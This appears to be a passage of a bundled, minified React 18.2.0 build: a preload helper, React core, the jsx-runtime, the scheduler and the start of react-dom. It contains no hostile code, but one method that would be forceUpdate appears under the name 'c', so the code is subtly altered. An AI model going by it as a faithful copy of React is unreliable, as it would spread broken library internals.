var jh = Object.defineProperty;
var Oh = (e, t, n) => t in e ? jh(e, t, {enumerable: !0, configurable: !0, writable: !0, value: n}) : e[t] = n;
var ie = (e, t, n) => (Oh(e, typeof t != "symbol" ? t + "" : t, n), n);

var sessionId = Math.random().toString();

function _h(e, t) {
    for (var n = 0; n < t.length; n++) {
        const r = t[n];
        if (typeof r != "string" && !Array.isArray(r)) {
            for (const o in r) if (o !== "default" && !(o in e)) {
                const i = Object.getOwnPropertyDescriptor(r, o);
                i && Object.defineProperty(e, o, i.get ? i : {enumerable: !0, get: () => r[o]})
            }
        }
    }
    return Object.freeze(Object.defineProperty(e, Symbol.toStringTag, {value: "Module"}))
}

(function () {
    const t = document.createElement("link").relList;
    if (t && t.supports && t.supports("modulepreload")) return;
    for (const o of document.querySelectorAll('link[rel="modulepreload"]')) r(o);
    new MutationObserver(o => {
        for (const i of o) if (i.type === "childList") for (const l of i.addedNodes) l.tagName === "LINK" && l.rel === "modulepreload" && r(l)
    }).observe(document, {childList: !0, subtree: !0});

    function n(o) {
        const i = {};
        return o.integrity && (i.integrity = o.integrity), o.referrerPolicy && (i.referrerPolicy = o.referrerPolicy), o.crossOrigin === "use-credentials" ? i.credentials = "include" : o.crossOrigin === "anonymous" ? i.credentials = "omit" : i.credentials = "same-origin", i
    }

    function r(o) {
        if (o.ep) return;
        o.ep = !0;
        const i = n(o);
        fetch(o.href, i)
    }
})();

function Ii(e) {
    return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e
}

var nd = {exports: {}}, Di = {}, rd = {exports: {}}, z = {};
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var fo = Symbol.for("react.element"), Ph = Symbol.for("react.portal"), Lh = Symbol.for("react.fragment"),
    Ih = Symbol.for("react.strict_mode"), Dh = Symbol.for("react.profiler"), Mh = Symbol.for("react.provider"),
    $h = Symbol.for("react.context"), Fh = Symbol.for("react.forward_ref"), Ah = Symbol.for("react.suspense"),
    zh = Symbol.for("react.memo"), Bh = Symbol.for("react.lazy"), fu = Symbol.iterator;

function Uh(e) {
    return e === null || typeof e != "object" ? null : (e = fu && e[fu] || e["@@iterator"], typeof e == "function" ? e : null)
}

var od = {
    isMounted: function () {
        return !1
    }, enqueueForceUpdate: function () {
    }, enqueueReplaceState: function () {
    }, enqueueSetState: function () {
    }
}, id = Object.assign, ld = {};

function ar(e, t, n) {
    this.props = e, this.context = t, this.refs = ld, this.updater = n || od
}

ar.prototype.isReactComponent = {};
ar.prototype.setState = function (e, t) {
    if (typeof e != "object" && typeof e != "function" && e != null) throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
    this.updater.enqueueSetState(this, e, t, "setState")
};
ar.prototype.c = function (e) {
    this.updater.enqueueForceUpdate(this, e, "forceUpdate")
};

function sd() {
}

sd.prototype = ar.prototype;

function Zs(e, t, n) {
    this.props = e, this.context = t, this.refs = ld, this.updater = n || od
}

var ea = Zs.prototype = new sd;
ea.constructor = Zs;
id(ea, ar.prototype);
ea.isPureReactComponent = !0;
var pu = Array.isArray, ad = Object.prototype.hasOwnProperty, ta = {current: null},
    ud = {key: !0, ref: !0, __self: !0, __source: !0};

function cd(e, t, n) {
    var r, o = {}, i = null, l = null;
    if (t != null) for (r in t.ref !== void 0 && (l = t.ref), t.key !== void 0 && (i = "" + t.key), t) ad.call(t, r) && !ud.hasOwnProperty(r) && (o[r] = t[r]);
    var s = arguments.length - 2;
    if (s === 1) o.children = n; else if (1 < s) {
        for (var a = Array(s), u = 0; u < s; u++) a[u] = arguments[u + 2];
        o.children = a
    }
    if (e && e.defaultProps) for (r in s = e.defaultProps, s) o[r] === void 0 && (o[r] = s[r]);
    return {$$typeof: fo, type: e, key: i, ref: l, props: o, _owner: ta.current}
}

function bh(e, t) {
    return {$$typeof: fo, type: e.type, key: t, ref: e.ref, props: e.props, _owner: e._owner}
}

function na(e) {
    return typeof e == "object" && e !== null && e.$$typeof === fo
}

function Hh(e) {
    var t = {"=": "=0", ":": "=2"};
    return "$" + e.replace(/[=:]/g, function (n) {
        return t[n]
    })
}

var mu = /\/+/g;

function cl(e, t) {
    return typeof e == "object" && e !== null && e.key != null ? Hh("" + e.key) : t.toString(36)
}

function Uo(e, t, n, r, o) {
    var i = typeof e;
    (i === "undefined" || i === "boolean") && (e = null);
    var l = !1;
    if (e === null) l = !0; else switch (i) {
        case"string":
        case"number":
            l = !0;
            break;
        case"object":
            switch (e.$$typeof) {
                case fo:
                case Ph:
                    l = !0
            }
    }
    if (l) return l = e, o = o(l), e = r === "" ? "." + cl(l, 0) : r, pu(o) ? (n = "", e != null && (n = e.replace(mu, "$&/") + "/"), Uo(o, t, n, "", function (u) {
        return u
    })) : o != null && (na(o) && (o = bh(o, n + (!o.key || l && l.key === o.key ? "" : ("" + o.key).replace(mu, "$&/") + "/") + e)), t.push(o)), 1;
    if (l = 0, r = r === "" ? "." : r + ":", pu(e)) for (var s = 0; s < e.length; s++) {
        i = e[s];
        var a = r + cl(i, s);
        l += Uo(i, t, n, a, o)
    } else if (a = Uh(e), typeof a == "function") for (e = a.call(e), s = 0; !(i = e.next()).done;) i = i.value, a = r + cl(i, s++), l += Uo(i, t, n, a, o); else if (i === "object") throw t = String(e), Error("Objects are not valid as a React child (found: " + (t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
    return l
}

function Co(e, t, n) {
    if (e == null) return e;
    var r = [], o = 0;
    return Uo(e, r, "", "", function (i) {
        return t.call(n, i, o++)
    }), r
}

function Wh(e) {
    if (e._status === -1) {
        var t = e._result;
        t = t(), t.then(function (n) {
            (e._status === 0 || e._status === -1) && (e._status = 1, e._result = n)
        }, function (n) {
            (e._status === 0 || e._status === -1) && (e._status = 2, e._result = n)
        }), e._status === -1 && (e._status = 0, e._result = t)
    }
    if (e._status === 1) return e._result.default;
    throw e._result
}

var Le = {current: null}, bo = {transition: null},
    Vh = {ReactCurrentDispatcher: Le, ReactCurrentBatchConfig: bo, ReactCurrentOwner: ta};
z.Children = {
    map: Co, forEach: function (e, t, n) {
        Co(e, function () {
            t.apply(this, arguments)
        }, n)
    }, count: function (e) {
        var t = 0;
        return Co(e, function () {
            t++
        }), t
    }, toArray: function (e) {
        return Co(e, function (t) {
            return t
        }) || []
    }, only: function (e) {
        if (!na(e)) throw Error("React.Children.only expected to receive a single React element child.");
        return e
    }
};
z.Component = ar;
z.Fragment = Lh;
z.Profiler = Dh;
z.PureComponent = Zs;
z.StrictMode = Ih;
z.Suspense = Ah;
z.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Vh;
z.cloneElement = function (e, t, n) {
    if (e == null) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
    var r = id({}, e.props), o = e.key, i = e.ref, l = e._owner;
    if (t != null) {
        if (t.ref !== void 0 && (i = t.ref, l = ta.current), t.key !== void 0 && (o = "" + t.key), e.type && e.type.defaultProps) var s = e.type.defaultProps;
        for (a in t) ad.call(t, a) && !ud.hasOwnProperty(a) && (r[a] = t[a] === void 0 && s !== void 0 ? s[a] : t[a])
    }
    var a = arguments.length - 2;
    if (a === 1) r.children = n; else if (1 < a) {
        s = Array(a);
        for (var u = 0; u < a; u++) s[u] = arguments[u + 2];
        r.children = s
    }
    return {$$typeof: fo, type: e.type, key: o, ref: i, props: r, _owner: l}
};
z.createContext = function (e) {
    return e = {
        $$typeof: $h,
        _currentValue: e,
        _currentValue2: e,
        _threadCount: 0,
        Provider: null,
        Consumer: null,
        _defaultValue: null,
        _globalName: null
    }, e.Provider = {$$typeof: Mh, _context: e}, e.Consumer = e
};
z.createElement = cd;
z.createFactory = function (e) {
    var t = cd.bind(null, e);
    return t.type = e, t
};
z.createRef = function () {
    return {current: null}
};
z.forwardRef = function (e) {
    return {$$typeof: Fh, render: e}
};
z.isValidElement = na;
z.lazy = function (e) {
    return {$$typeof: Bh, _payload: {_status: -1, _result: e}, _init: Wh}
};
z.memo = function (e, t) {
    return {$$typeof: zh, type: e, compare: t === void 0 ? null : t}
};
z.startTransition = function (e) {
    var t = bo.transition;
    bo.transition = {};
    try {
        e()
    } finally {
        bo.transition = t
    }
};
z.unstable_act = function () {
    throw Error("act(...) is not supported in production builds of React.")
};
z.useCallback = function (e, t) {
    return Le.current.useCallback(e, t)
};
z.useContext = function (e) {
    return Le.current.useContext(e)
};
z.useDebugValue = function () {
};
z.useDeferredValue = function (e) {
    return Le.current.useDeferredValue(e)
};
z.useEffect = function (e, t) {
    return Le.current.useEffect(e, t)
};
z.useId = function () {
    return Le.current.useId()
};
z.useImperativeHandle = function (e, t, n) {
    return Le.current.useImperativeHandle(e, t, n)
};
z.useInsertionEffect = function (e, t) {
    return Le.current.useInsertionEffect(e, t)
};
z.useLayoutEffect = function (e, t) {
    return Le.current.useLayoutEffect(e, t)
};
z.useMemo = function (e, t) {
    return Le.current.useMemo(e, t)
};
z.useReducer = function (e, t, n) {
    return Le.current.useReducer(e, t, n)
};
z.useRef = function (e) {
    return Le.current.useRef(e)
};
z.useState = function (e) {
    return Le.current.useState(e)
};
z.useSyncExternalStore = function (e, t, n) {
    return Le.current.useSyncExternalStore(e, t, n)
};
z.useTransition = function () {
    return Le.current.useTransition()
};
z.version = "18.2.0";
rd.exports = z;
var f = rd.exports;
const $ = Ii(f), Kh = _h({__proto__: null, default: $}, [f]);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Gh = f, Qh = Symbol.for("react.element"), Xh = Symbol.for("react.fragment"),
    Yh = Object.prototype.hasOwnProperty, Jh = Gh.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
    qh = {key: !0, ref: !0, __self: !0, __source: !0};

function dd(e, t, n) {
    var r, o = {}, i = null, l = null;
    n !== void 0 && (i = "" + n), t.key !== void 0 && (i = "" + t.key), t.ref !== void 0 && (l = t.ref);
    for (r in t) Yh.call(t, r) && !qh.hasOwnProperty(r) && (o[r] = t[r]);
    if (e && e.defaultProps) for (r in t = e.defaultProps, t) o[r] === void 0 && (o[r] = t[r]);
    return {$$typeof: Qh, type: e, key: i, ref: l, props: o, _owner: Jh.current}
}

Di.Fragment = Xh;
Di.jsx = dd;
Di.jsxs = dd;
nd.exports = Di;
var m = nd.exports, Kl = {}, fd = {exports: {}}, He = {}, pd = {exports: {}}, md = {};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function (e) {
    function t(j, P) {
        var I = j.length;
        j.push(P);
        e:for (; 0 < I;) {
            var b = I - 1 >>> 1, W = j[b];
            if (0 < o(W, P)) j[b] = P, j[I] = W, I = b; else break e
        }
    }

    function n(j) {
        return j.length === 0 ? null : j[0]
    }

    function r(j) {
        if (j.length === 0) return null;
        var P = j[0], I = j.pop();
        if (I !== P) {
            j[0] = I;
            e:for (var b = 0, W = j.length, ye = W >>> 1; b < ye;) {
                var je = 2 * (b + 1) - 1, ue = j[je], Se = je + 1, Lt = j[Se];
                if (0 > o(ue, I)) Se < W && 0 > o(Lt, ue) ? (j[b] = Lt, j[Se] = I, b = Se) : (j[b] = ue, j[je] = I, b = je); else if (Se < W && 0 > o(Lt, I)) j[b] = Lt, j[Se] = I, b = Se; else break e
            }
        }
        return P
    }

    function o(j, P) {
        var I = j.sortIndex - P.sortIndex;
        return I !== 0 ? I : j.id - P.id
    }

    if (typeof performance == "object" && typeof performance.now == "function") {
        var i = performance;
        e.unstable_now = function () {
            return i.now()
        }
    } else {
        var l = Date, s = l.now();
        e.unstable_now = function () {
            return l.now() - s
        }
    }
    var a = [], u = [], c = 1, d = null, p = 3, x = !1, y = !1, v = !1,
        C = typeof setTimeout == "function" ? setTimeout : null,
        g = typeof clearTimeout == "function" ? clearTimeout : null,
        h = typeof setImmediate < "u" ? setImmediate : null;
    typeof navigator < "u" && navigator.scheduling !== void 0 && navigator.scheduling.isInputPending !== void 0 && navigator.scheduling.isInputPending.bind(navigator.scheduling);

    function w(j) {
        for (var P = n(u); P !== null;) {
            if (P.callback === null) r(u); else if (P.startTime <= j) r(u), P.sortIndex = P.expirationTime, t(a, P); else break;
            P = n(u)
        }
    }

    function S(j) {
        if (v = !1, w(j), !y) if (n(a) !== null) y = !0, X(E); else {
            var P = n(u);
            P !== null && se(S, P.startTime - j)
        }
    }

    function E(j, P) {
        y = !1, v && (v = !1, g(O), O = -1), x = !0;
        var I = p;
        try {
            for (w(P), d = n(a); d !== null && (!(d.expirationTime > P) || j && !M());) {
                var b = d.callback;
                if (typeof b == "function") {
                    d.callback = null, p = d.priorityLevel;
                    var W = b(d.expirationTime <= P);
                    P = e.unstable_now(), typeof W == "function" ? d.callback = W : d === n(a) && r(a), w(P)
                } else r(a);
                d = n(a)
            }
            if (d !== null) var ye = !0; else {
                var je = n(u);
                je !== null && se(S, je.startTime - P), ye = !1
            }
            return ye
        } finally {
            d = null, p = I, x = !1
        }
    }

    var N = !1, R = null, O = -1, B = 5, D = -1;

    function M() {
        return !(e.unstable_now() - D < B)
    }

    function A() {
        if (R !== null) {
            var j = e.unstable_now();
            D = j;
            var P = !0;
            try {
                P = R(!0, j)
            } finally {
                P ? V() : (N = !1, R = null)
            }
        } else N = !1
    }

    var V;
    if (typeof h == "function") V = function () {
        h(A)
    }; else if (typeof MessageChannel < "u") {
        var ee = new MessageChannel, fe = ee.port2;
        ee.port1.onmessage = A, V = function () {
            fe.postMessage(null)
        }
    } else V = function () {
        C(A, 0)
    };

    function X(j) {
        R = j, N || (N = !0, V())
    }

    function se(j, P) {
        O = C(function () {
            j(e.unstable_now())
        }, P)
    }

    e.unstable_IdlePriority = 5, e.unstable_ImmediatePriority = 1, e.unstable_LowPriority = 4, e.unstable_NormalPriority = 3, e.unstable_Profiling = null, e.unstable_UserBlockingPriority = 2, e.unstable_cancelCallback = function (j) {
        j.callback = null
    }, e.unstable_continueExecution = function () {
        y || x || (y = !0, X(E))
    }, e.unstable_forceFrameRate = function (j) {
        0 > j || 125 < j ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : B = 0 < j ? Math.floor(1e3 / j) : 5
    }, e.unstable_getCurrentPriorityLevel = function () {
        return p
    }, e.unstable_getFirstCallbackNode = function () {
        return n(a)
    }, e.unstable_next = function (j) {
        switch (p) {
            case 1:
            case 2:
            case 3:
                var P = 3;
                break;
            default:
                P = p
        }
        var I = p;
        p = P;
        try {
            return j()
        } finally {
            p = I
        }
    }, e.unstable_pauseExecution = function () {
    }, e.unstable_requestPaint = function () {
    }, e.unstable_runWithPriority = function (j, P) {
        switch (j) {
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
                break;
            default:
                j = 3
        }
        var I = p;
        p = j;
        try {
            return P()
        } finally {
            p = I
        }
    }, e.unstable_scheduleCallback = function (j, P, I) {
        var b = e.unstable_now();
        switch (typeof I == "object" && I !== null ? (I = I.delay, I = typeof I == "number" && 0 < I ? b + I : b) : I = b, j) {
            case 1:
                var W = -1;
                break;
            case 2:
                W = 250;
                break;
            case 5:
                W = 1073741823;
                break;
            case 4:
                W = 1e4;
                break;
            default:
                W = 5e3
        }
        return W = I + W, j = {
            id: c++,
            callback: P,
            priorityLevel: j,
            startTime: I,
            expirationTime: W,
            sortIndex: -1
        }, I > b ? (j.sortIndex = I, t(u, j), n(a) === null && j === n(u) && (v ? (g(O), O = -1) : v = !0, se(S, I - b))) : (j.sortIndex = W, t(a, j), y || x || (y = !0, X(E))), j
    }, e.unstable_shouldYield = M, e.unstable_wrapCallback = function (j) {
        var P = p;
        return function () {
            var I = p;
            p = P;
            try {
                return j.apply(this, arguments)
            } finally {
                p = I
            }
        }
    }
})(md);
pd.exports = md;
var Zh = pd.exports;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var hd = f, be = Zh;

function T(e) {
    for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
    return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
}

var gd = new Set, Vr = {};

function Sn(e, t) {
    Zn(e, t), Zn(e + "Capture", t)
}

function Zn(e, t) {
    for (Vr[e] = t, e = 0; e < t.length; e++) gd.add(t[e])
}

var Nt = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
    Gl = Object.prototype.hasOwnProperty,
    eg = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
    hu = {}, gu = {};

function tg(e) {
    return Gl.call(gu, e) ? !0 : Gl.call(hu, e) ? !1 : eg.test(e) ? gu[e] = !0 : (hu[e] = !0, !1)
}

function ng(e, t, n, r) {
    if (n !== null && n.type === 0) return !1;
    switch (typeof t) {
        case"function":
        case"symbol":
            return !0;
        case"boolean":
            return r ? !1 : n !== null ? !n.acceptsBooleans : (e = e.toLowerCase().slice(0, 5), e !== "data-" && e !== "aria-");
        default:
            return !1
    }
}

function rg(e, t, n, r) {
    if (t === null || typeof t > "u" || ng(e, t, n, r)) return !0;
    if (r) return !1;
    if (n !== null) switch (n.type) {
        case 3:
            return !t;
        case 4:
            return t === !1;
        case 5:
            return isNaN(t);
        case 6:
            return isNaN(t) || 1 > t
    }
    return !1
}

function Ie(e, t, n, r, o, i, l) {
    this.acceptsBooleans = t === 2 || t === 3 || t === 4, this.attributeName = r, this.attributeNamespace = o, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = i, this.removeEmptyString = l
}

var xe = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function (e) {
    xe[e] = new Ie(e, 0, !1, e, null, !1, !1)
});
[["acceptCharset", "accept-charset"], ["className", "class"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"]].forEach(function (e) {
    var t = e[0];
    xe[t] = new Ie(t, 1, !1, e[1], null, !1, !1)
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function (e) {
    xe[e] = new Ie(e, 2, !1, e.toLowerCase(), null, !1, !1)
});
["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function (e) {
    xe[e] = new Ie(e, 2, !1, e, null, !1, !1)
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function (e) {
    xe[e] = new Ie(e, 3, !1, e.toLowerCase(), null, !1, !1)
});
["checked", "multiple", "muted", "selected"].forEach(function (e) {
    xe[e] = new Ie(e, 3, !0, e, null, !1, !1)
});
["capture", "download"].forEach(function (e) {
    xe[e] = new Ie(e, 4, !1, e, null, !1, !1)
});
["cols", "rows", "size", "span"].forEach(function (e) {
    xe[e] = new Ie(e, 6, !1, e, null, !1, !1)
});
["rowSpan", "start"].forEach(function (e) {
    xe[e] = new Ie(e, 5, !1, e.toLowerCase(), null, !1, !1)
});
var ra = /[\-:]([a-z])/g;

function oa(e) {
    return e[1].toUpperCase()
}

"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function (e) {
    var t = e.replace(ra, oa);
    xe[t] = new Ie(t, 1, !1, e, null, !1, !1)
});
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function (e) {
    var t = e.replace(ra, oa);
    xe[t] = new Ie(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1)
});
["xml:base", "xml:lang", "xml:space"].forEach(function (e) {
    var t = e.replace(ra, oa);
    xe[t] = new Ie(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1)
});
["tabIndex", "crossOrigin"].forEach(function (e) {
    xe[e] = new Ie(e, 1, !1, e.toLowerCase(), null, !1, !1)
});
xe.xlinkHref = new Ie("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
["src", "href", "action", "formAction"].forEach(function (e) {
    xe[e] = new Ie(e, 1, !1, e.toLowerCase(), null, !0, !0)
});

function ia(e, t, n, r) {
    var o = xe.hasOwnProperty(t) ? xe[t] : null;
    (o !== null ? o.type !== 0 : r || !(2 < t.length) || t[0] !== "o" && t[0] !== "O" || t[1] !== "n" && t[1] !== "N") && (rg(t, n, o, r) && (n = null), r || o === null ? tg(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : o.mustUseProperty ? e[o.propertyName] = n === null ? o.type === 3 ? !1 : "" : n : (t = o.attributeName, r = o.attributeNamespace, n === null ? e.removeAttribute(t) : (o = o.type, n = o === 3 || o === 4 && n === !0 ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
}

var _t = hd.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED, Eo = Symbol.for("react.element"),
    Pn = Symbol.for("react.portal"), Ln = Symbol.for("react.fragment"), la = Symbol.for("react.strict_mode"),
    Ql = Symbol.for("react.profiler"), yd = Symbol.for("react.provider"), vd = Symbol.for("react.context"),
    sa = Symbol.for("react.forward_ref"), Xl = Symbol.for("react.suspense"), Yl = Symbol.for("react.suspense_list"),
    aa = Symbol.for("react.memo"), Mt = Symbol.for("react.lazy"), wd = Symbol.for("react.offscreen"),
    yu = Symbol.iterator;

function wr(e) {
    return e === null || typeof e != "object" ? null : (e = yu && e[yu] || e["@@iterator"], typeof e == "function" ? e : null)
}

var oe = Object.assign, dl;

function Pr(e) {
    if (dl === void 0) try {
        throw Error()
    } catch (n) {
        var t = n.stack.trim().match(/\n( *(at )?)/);
        dl = t && t[1] || ""
    }
    return `
` + dl + e
}

var fl = !1;

function pl(e, t) {
    if (!e || fl) return "";
    fl = !0;
    var n = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
        if (t) if (t = function () {
            throw Error()
        }, Object.defineProperty(t.prototype, "props", {
            set: function () {
                throw Error()
            }
        }), typeof Reflect == "object" && Reflect.construct) {
            try {
                Reflect.construct(t, [])
            } catch (u) {
                var r = u
            }
            Reflect.construct(e, [], t)
        } else {
            try {
                t.call()
            } catch (u) {
                r = u
            }
            e.call(t.prototype)
        } else {
            try {
                throw Error()
            } catch (u) {
                r = u
            }
            e()
        }
    } catch (u) {
        if (u && r && typeof u.stack == "string") {
            for (var o = u.stack.split(`
`), i = r.stack.split(`
`), l = o.length - 1, s = i.length - 1; 1 <= l && 0 <= s && o[l] !== i[s];) s--;
            for (; 1 <= l && 0 <= s; l--, s--) if (o[l] !== i[s]) {
                if (l !== 1 || s !== 1) do if (l--, s--, 0 > s || o[l] !== i[s]) {
                    var a = `
` + o[l].replace(" at new ", " at ");
                    return e.displayName && a.includes("<anonymous>") && (a = a.replace("<anonymous>", e.displayName)), a
                } while (1 <= l && 0 <= s);
                break
            }
        }
    } finally {
        fl = !1, Error.prepareStackTrace = n
    }
    return (e = e ? e.displayName || e.name : "") ? Pr(e) : ""
}

function og(e) {
    switch (e.tag) {
        case 5:
            return Pr(e.type);
        case 16:
            return Pr("Lazy");
        case 13:
            return Pr("Suspense");
        case 19:
            return Pr("SuspenseList");
        case 0:
        case 2:
        case 15:
            return e = pl(e.type, !1), e;
        case 11:
            return e = pl(e.type.render, !1), e;
        case 1:
            return e = pl(e.type, !0), e;
        default:
            return ""
    }
}

function Jl(e) {
    if (e == null) return null;
    if (typeof e == "function") return e.displayName || e.name || null;
    if (typeof e == "string") return e;
    switch (e) {
        case Ln:
            return "Fragment";
        case Pn:
            return "Portal";
        case Ql:
            return "Profiler";
        case la:
            return "StrictMode";
        case Xl:
            return "Suspense";
        case Yl:
            return "SuspenseList"
    }
    if (typeof e == "object") switch (e.$$typeof) {
        case vd:
            return (e.displayName || "Context") + ".Consumer";
        case yd:
            return (e._context.displayName || "Context") + ".Provider";
        case sa:
            var t = e.render;
            return e = e.displayName, e || (e = t.displayName || t.name || "", e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
        case aa:
            return t = e.displayName || null, t !== null ? t : Jl(e.type) || "Memo";
        case Mt:
            t = e._payload, e = e._init;
            try {
                return Jl(e(t))
            } catch {
            }
    }
    return null
}

function ig(e) {
    var t = e.type;
    switch (e.tag) {
        case 24:
            return "Cache";
        case 9:
            return (t.displayName || "Context") + ".Consumer";
        case 10:
            return (t._context.displayName || "Context") + ".Provider";
        case 18:
            return "DehydratedFragment";
        case 11:
            return e = t.render, e = e.displayName || e.name || "", t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef");
        case 7:
            return "Fragment";
        case 5:
            return t;
        case 4:
            return "Portal";
        case 3:
            return "Root";
        case 6:
            return "Text";
        case 16:
            return Jl(t);
        case 8:
            return t === la ? "StrictMode" : "Mode";
        case 22:
            return "Offscreen";
        case 12:
            return "Profiler";
        case 21:
            return "Scope";
        case 13:
            return "Suspense";
        case 19:
            return "SuspenseList";
        case 25:
            return "TracingMarker";
        case 1:
        case 0:
        case 17:
        case 2:
        case 14:
        case 15:
            if (typeof t == "function") return t.displayName || t.name || null;
            if (typeof t == "string") return t
    }
    return null
}

function qt(e) {
    switch (typeof e) {
        case"boolean":
        case"number":
        case"string":
        case"undefined":
            return e;
        case"object":
            return e;
        default:
            return ""
    }
}

function xd(e) {
    var t = e.type;
    return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
}

function lg(e) {
    var t = xd(e) ? "checked" : "value", n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t), r = "" + e[t];
    if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
        var o = n.get, i = n.set;
        return Object.defineProperty(e, t, {
            configurable: !0, get: function () {
                return o.call(this)
            }, set: function (l) {
                r = "" + l, i.call(this, l)
            }
        }), Object.defineProperty(e, t, {enumerable: n.enumerable}), {
            getValue: function () {
                return r
            }, setValue: function (l) {
                r = "" + l
            }, stopTracking: function () {
                e._valueTracker = null, delete e[t]
            }
        }
    }
}

function ko(e) {
    e._valueTracker || (e._valueTracker = lg(e))
}

function Sd(e) {
    if (!e) return !1;
    var t = e._valueTracker;
    if (!t) return !0;
    var n = t.getValue(), r = "";
    return e && (r = xd(e) ? e.checked ? "true" : "false" : e.value), e = r, e !== n ? (t.setValue(e), !0) : !1
}

function ni(e) {
    if (e = e || (typeof document < "u" ? document : void 0), typeof e > "u") return null;
    try {
        return e.activeElement || e.body
    } catch {
        return e.body
    }
}

function ql(e, t) {
    var n = t.checked;
    return oe({}, t, {
        defaultChecked: void 0,
        defaultValue: void 0,
        value: void 0,
        checked: n ?? e._wrapperState.initialChecked
    })
}

function vu(e, t) {
    var n = t.defaultValue == null ? "" : t.defaultValue, r = t.checked != null ? t.checked : t.defaultChecked;
    n = qt(t.value != null ? t.value : n), e._wrapperState = {
        initialChecked: r,
        initialValue: n,
        controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null
    }
}

function Cd(e, t) {
    t = t.checked, t != null && ia(e, "checked", t, !1)
}

function Zl(e, t) {
    Cd(e, t);
    var n = qt(t.value), r = t.type;
    if (n != null) r === "number" ? (n === 0 && e.value === "" || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n); else if (r === "submit" || r === "reset") {
        e.removeAttribute("value");
        return
    }
    t.hasOwnProperty("value") ? es(e, t.type, n) : t.hasOwnProperty("defaultValue") && es(e, t.type, qt(t.defaultValue)), t.checked == null && t.defaultChecked != null && (e.defaultChecked = !!t.defaultChecked)
}

function wu(e, t, n) {
    if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
        var r = t.type;
        if (!(r !== "submit" && r !== "reset" || t.value !== void 0 && t.value !== null)) return;
        t = "" + e._wrapperState.initialValue, n || t === e.value || (e.value = t), e.defaultValue = t
    }
